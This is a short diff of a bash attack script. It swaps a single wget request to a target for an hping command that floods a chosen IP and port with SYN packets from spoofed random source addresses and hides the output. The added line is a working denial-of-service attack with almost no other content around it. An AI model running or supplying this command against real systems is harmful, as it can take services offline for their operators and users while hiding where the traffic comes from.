@@ -1,8 +1,8 @@
-#!/usr/bin/bash
-set -euo pipefail
+#!/bin/bash
 
-TARGET=$1
-COUNT=1 # Capped to 1 for now because attack does not stop until script finishes workload
+# ------ ARGUMENTS ------
+TARGET_IP=$1
+TARGET_PORT=$2
 
-# echo "[A] Attacking ${TARGET} (${COUNT})" >&2 # Commented out to reduce noise
-wget -qO- $TARGET > /dev/null
+# > /dev/null - run command but hide output
+hping --flood -S -p $TARGET_PORT --rand-source $TARGET_IP > /dev/null
